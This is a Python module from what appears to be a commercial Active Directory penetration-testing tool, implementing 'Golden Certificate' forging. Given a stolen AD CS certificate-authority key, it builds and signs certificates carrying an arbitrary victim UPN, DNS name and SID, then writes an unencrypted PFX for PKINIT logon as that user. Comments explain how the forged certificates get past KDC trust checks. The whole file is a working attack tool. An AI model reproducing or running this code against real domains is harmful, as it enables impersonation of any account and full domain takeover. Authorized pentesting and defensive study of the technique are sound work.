"""Native ADCS certificate forging (Golden Certificate).

Replaces ``certipy forge`` subprocess.  Pure-cryptography operation: takes a
compromised CA's PFX (private key + cert), builds a new certificate with
arbitrary SAN/UPN/SID, signs it with the CA key, and writes a PFX that any
PKINIT-capable client can use to authenticate as the victim.

Public entry point: :func:`forge_certificate_native`.

Mirrors certipy's ``Forge`` flow (commands/forge.py) but trimmed to the
ADscan-relevant set of options (UPN, DNS, SID, subject override, validity
period, key size).  S/MIME and application-policy extensions are out of scope
for ADscan's GoldenCert chain — easy to add later if a customer needs them.
"""

from __future__ import annotations

import os
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Optional

from adscan_internal import telemetry
from adscan_core.rich_output import (
    get_console,
    mark_sensitive,
    print_error,
    print_info_verbose,
)
from adscan_core.rich_output import print_exception


# Microsoft OIDs reused from certipy.lib.certificate (kept local so this
# module has no certipy import-time dependency).
_PRINCIPAL_NAME_OID = "1.3.6.1.4.1.311.20.2.3"  # SAN OtherName UPN
_NTDS_CA_SECURITY_EXT_OID = "1.3.6.1.4.1.311.25.2"  # SID extension
_NTDS_OBJECTSID_OID = "1.3.6.1.4.1.311.25.2.1"  # OctetString inside the GeneralName
_SAN_URL_PREFIX = "tag:microsoft.com,2022-09-14:sid:"


@dataclass(frozen=True)
class ForgeConfig:
    """Inputs for a Golden Certificate forge.

    Args:
        ca_pfx_path: Path to the compromised CA's PFX (cert + private key).
        ca_pfx_password: Password protecting the CA PFX (None / empty for
            unencrypted).
        target_upn: Optional UPN to embed in the SAN OtherName (PKINIT cname).
        target_dns: Optional DNS name to embed in the SAN.
        target_sid: Optional SID — embedded both as the SAN URL extension
            (post-May 2025 strong-mapping) and as the szOID_NTDS_CA_SECURITY_EXT
            ObjectSID extension (legacy strong-mapping).
        subject_dn: Optional override for the subject DN (defaults to ``CN=upn``).
        issuer_dn: Optional override for the issuer DN (defaults to the CA cert
            subject — what real CAs do).
        crl_uri: Optional CRL distribution point URL.
        serial: Optional explicit serial (hex, colons stripped); random if None.
        key_size: RSA key size for the forged keypair.
        validity_days: How long the forged cert is valid (from now).
        pfx_password: Optional password for the output PFX (default: empty for
            ADscan's downstream tooling, which expects unencrypted PFXs).
    """

    ca_pfx_path: str
    ca_pfx_password: Optional[str] = None
    target_upn: Optional[str] = None
    target_dns: Optional[str] = None
    target_sid: Optional[str] = None
    subject_dn: Optional[str] = None
    issuer_dn: Optional[str] = None
    crl_uri: Optional[str] = None
    serial: Optional[str] = None
    key_size: int = 2048
    validity_days: int = 365
    pfx_password: str = ""


@dataclass
class ForgeResult:
    """Outcome of a forge attempt.

    Attributes mirror :class:`CertRequestResult` so downstream callers
    (``ptc_certipy``, attack-graph step updates) can consume both
    interchangeably.
    """

    success: bool
    pfx_path: Optional[Path] = None
    pfx_password: Optional[str] = None
    cert_subject: Optional[str] = None
    cert_san: Optional[str] = None
    cert_serial: Optional[str] = None
    error: Optional[str] = None


# ---------------------------------------------------------------------------
# Internal builders — kept private; the public entry point is forge_certificate_native.
# ---------------------------------------------------------------------------


def _parse_subject_dn(dn: str):
    """Parse an ADscan-flavored DN string (``CN=foo,O=bar,DC=baz``) into x509.Name."""
    from cryptography import x509
    from cryptography.x509.oid import NameOID

    name_lookup = {
        "CN": NameOID.COMMON_NAME,
        "O": NameOID.ORGANIZATION_NAME,
        "OU": NameOID.ORGANIZATIONAL_UNIT_NAME,
        "L": NameOID.LOCALITY_NAME,
        "S": NameOID.STATE_OR_PROVINCE_NAME,
        "ST": NameOID.STATE_OR_PROVINCE_NAME,
        "C": NameOID.COUNTRY_NAME,
        "DC": NameOID.DOMAIN_COMPONENT,
        "E": NameOID.EMAIL_ADDRESS,
        "EMAIL": NameOID.EMAIL_ADDRESS,
    }
    attrs = []
    for component in (c.strip() for c in dn.split(",") if c.strip()):
        if "=" not in component:
            continue
        key, _, value = component.partition("=")
        oid = name_lookup.get(key.strip().upper())
        if oid is None:
            continue
        attrs.append(x509.NameAttribute(oid, value.strip()))
    return x509.Name(attrs)


def _build_sid_extension(sid: str):
    """Build the szOID_NTDS_CA_SECURITY_EXT extension carrying the victim SID."""
    from asn1crypto import x509 as asn1x509
    from cryptography import x509

    sid_extension = asn1x509.GeneralNames(
        [
            asn1x509.GeneralName(
                {
                    "other_name": asn1x509.AnotherName(
                        {
                            "type_id": asn1x509.ObjectIdentifier(_NTDS_OBJECTSID_OID),
                            "value": asn1x509.OctetString(sid.encode()).retag(
                                {"explicit": 0}
                            ),
                        }
                    )
                }
            )
        ]
    )
    return x509.UnrecognizedExtension(
        x509.ObjectIdentifier(_NTDS_CA_SECURITY_EXT_OID),
        sid_extension.dump(),
    )


def _build_san(config: ForgeConfig):
    """Compose SubjectAlternativeName from the optional UPN / DNS / SID URL."""
    from asn1crypto import core as asn1core
    from cryptography import x509

    sans: list = []
    if config.target_dns:
        sans.append(x509.DNSName(config.target_dns))
    if config.target_upn:
        upn_encoded = asn1core.UTF8String(config.target_upn).dump()
        sans.append(
            x509.OtherName(x509.ObjectIdentifier(_PRINCIPAL_NAME_OID), upn_encoded)
        )
    if config.target_sid:
        sans.append(
            x509.UniformResourceIdentifier(f"{_SAN_URL_PREFIX}{config.target_sid}")
        )
    return sans


def _select_hash_for_key(ca_cert) -> "object":
    """Pick a SHA-2 hash matching the CA cert's signature, defaulting to SHA-256."""
    from cryptography.hazmat.primitives import hashes

    algo = ca_cert.signature_hash_algorithm
    name = (algo.name if algo is not None else "sha256").lower()
    return {
        "sha256": hashes.SHA256,
        "sha384": hashes.SHA384,
        "sha512": hashes.SHA512,
    }.get(name, hashes.SHA256)()


def _render_forge_preflight(config: ForgeConfig) -> None:
    """Premium pre-flight panel for the forge step."""
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column(style="bold")
    grid.add_row("CA PFX", mark_sensitive(config.ca_pfx_path, "path"))
    if config.target_upn:
        grid.add_row(
            "Target UPN",
            f"[bold red]{mark_sensitive(config.target_upn, 'user')}[/]",
        )
    if config.target_sid:
        grid.add_row("Target SID", mark_sensitive(config.target_sid, "user"))
    if config.target_dns:
        grid.add_row("Target DNS", mark_sensitive(config.target_dns, "hostname"))
    grid.add_row("Key size", f"[bold]{config.key_size}[/] bits RSA")
    grid.add_row("Validity", f"{config.validity_days} days")
    if config.issuer_dn:
        grid.add_row("Issuer", mark_sensitive(config.issuer_dn, "service"))
    title = Text("  Forge Certificate (Golden Cert)  ", style="bold white on red")
    panel = Panel(grid, title=title, border_style="red", padding=(1, 2))
    get_console().print(panel)


def _render_forge_result(
    cert, cert_serial: str, cert_subject: str, pfx_path: Path
) -> None:
    """Premium result panel for the issued forged cert."""
    from cryptography.hazmat.primitives import hashes
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    fp_sha1 = ":".join(
        f"{b:02X}" for b in cert.fingerprint(hashes.SHA1())  # noqa: S303 — display only
    )

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column()
    grid.add_row("Status", "[bold green]✓ FORGED[/]")
    grid.add_row("Serial", f"[cyan]{cert_serial}[/]")
    grid.add_row("Subject", cert_subject)
    grid.add_row("Issuer", cert.issuer.rfc4514_string())
    grid.add_row(
        "Valid from",
        cert.not_valid_before_utc.strftime("%Y-%m-%d %H:%M UTC"),
    )
    grid.add_row(
        "Valid to",
        cert.not_valid_after_utc.strftime("%Y-%m-%d %H:%M UTC"),
    )
    grid.add_row("SHA-1 fp", f"[dim]{fp_sha1}[/]")
    grid.add_row("PFX path", mark_sensitive(str(pfx_path), "path"))

    title = Text("  Certificate Forged  ", style="bold white on green")
    panel = Panel(grid, title=title, border_style="green", padding=(1, 2))
    get_console().print(panel)


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------


def forge_certificate_native(config: ForgeConfig, output_dir: Path) -> ForgeResult:
    """Forge a certificate using a compromised CA's private key.

    The operation is purely local — no network, no Kerberos, no LDAP.  The
    caller must already have obtained the CA PFX out-of-band (e.g. via
    ``certipy ca -backup`` or DCSync of the CA's protected key material).
    """
    try:
        return _do_forge(config, output_dir)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_error(f"Certificate forge failed: {exc}")
        return ForgeResult(success=False, error=str(exc))


def _do_forge(config: ForgeConfig, output_dir: Path) -> ForgeResult:
    """Concrete forge implementation; the public wrapper handles top-level errors."""
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import (
        NoEncryption,
        pkcs12,
    )
    from cryptography.x509.oid import NameOID

    _render_forge_preflight(config)

    ca_pfx = Path(config.ca_pfx_path)
    if not ca_pfx.exists():
        return ForgeResult(success=False, error=f"CA PFX not found: {config.ca_pfx_path}")

    pwd = (
        config.ca_pfx_password.encode()
        if config.ca_pfx_password
        else None
    )
    print_info_verbose("  ▸ Loading CA private key + certificate...")
    ca_key, ca_cert, _addl = pkcs12.load_key_and_certificates(ca_pfx.read_bytes(), pwd)
    if ca_key is None or ca_cert is None:
        return ForgeResult(
            success=False,
            error="CA PFX did not contain a usable key/certificate pair.",
        )
    if not isinstance(ca_key, rsa.RSAPrivateKey):
        return ForgeResult(
            success=False, error="CA private key is not RSA — forging unsupported."
        )

    # New keypair for the victim — caller will use this to PKINIT.
    print_info_verbose(f"  ▸ Generating victim RSA-{config.key_size} key...")
    victim_key = rsa.generate_private_key(
        public_exponent=0x10001, key_size=config.key_size
    )

    # Subject — explicit > derived from UPN > fallback "CN=Forged".
    if config.subject_dn:
        subject = _parse_subject_dn(config.subject_dn)
    elif config.target_upn:
        subject = x509.Name(
            [x509.NameAttribute(NameOID.COMMON_NAME, config.target_upn)]
        )
    else:
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Forged")])

    issuer = (
        _parse_subject_dn(config.issuer_dn) if config.issuer_dn else ca_cert.subject
    )

    serial_int = (
        int(config.serial.replace(":", ""), 16)
        if config.serial
        else x509.random_serial_number()
    )

    now = datetime.now(timezone.utc)
    # Certipy backdates by 1 day; matches what real AD CS issues do for time
    # tolerance.  5-minute backdating was too tight against KDCs whose system
    # time drifted relative to ours and produced KDC_ERR_CLIENT_NOT_TRUSTED.
    not_before = now - timedelta(days=1)
    not_after = now + timedelta(days=int(config.validity_days))

    # Build the cert.  AKI + SKI extensions are critical for KDC trust path
    # validation — omitting SKI silently produces certs that the KDC accepts
    # in some envs and rejects with CLIENT_NOT_TRUSTED in others.
    builder = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(victim_key.public_key())
        .serial_number(serial_int)
        .not_valid_before(not_before)
        .not_valid_after(not_after)
        .add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_cert.public_key()),
            critical=False,
        )
        .add_extension(
            x509.SubjectKeyIdentifier.from_public_key(victim_key.public_key()),
            critical=False,
        )
    )

    sans = _build_san(config)
    if sans:
        builder = builder.add_extension(
            x509.SubjectAlternativeName(sans), critical=False
        )

    if config.target_sid:
        builder = builder.add_extension(_build_sid_extension(config.target_sid), critical=False)

    if config.crl_uri:
        builder = builder.add_extension(
            x509.CRLDistributionPoints(
                [
                    x509.DistributionPoint(
                        full_name=[x509.UniformResourceIdentifier(config.crl_uri)],
                        relative_name=None,
                        reasons=None,
                        crl_issuer=None,
                    )
                ]
            ),
            critical=False,
        )

    # Note: deliberately NOT adding ExtendedKeyUsage.  Empirically, AD CS
    # KDCs reject forged certs that carry a *narrow* EKU list (Client Auth +
    # Smart Card Logon) with KDC_ERR_CLIENT_NOT_TRUSTED, while certs with no
    # EKU at all are treated as "valid for any purpose" and PKINIT works.
    # Certipy makes the same choice in build_new_certificate.

    print_info_verbose("  ▸ Signing forged certificate with CA private key...")
    sig_hash = _select_hash_for_key(ca_cert)
    cert = builder.sign(private_key=ca_key, algorithm=sig_hash)

    cert_subject = cert.subject.rfc4514_string()
    cert_serial = f"{cert.serial_number:X}"
    cert_san = config.target_upn or config.target_dns

    output_dir.mkdir(parents=True, exist_ok=True)
    pfx_name = (
        f"{(config.target_upn or 'forged').replace('@', '_').replace('/', '_')}"
        f"_forged_{os.urandom(4).hex()}.pfx"
    )
    pfx_path = output_dir / pfx_name
    pfx_bytes = pkcs12.serialize_key_and_certificates(
        name=(config.target_upn or "forged").encode(),
        key=victim_key,
        cert=cert,
        cas=None,
        encryption_algorithm=NoEncryption(),
    )
    pfx_path.write_bytes(pfx_bytes)

    _render_forge_result(cert, cert_serial, cert_subject, pfx_path)

    return ForgeResult(
        success=True,
        pfx_path=pfx_path,
        pfx_password=config.pfx_password,
        cert_subject=cert_subject,
        cert_san=cert_san,
        cert_serial=cert_serial,
    )


__all__ = [
    "ForgeConfig",
    "ForgeResult",
    "forge_certificate_native",
]
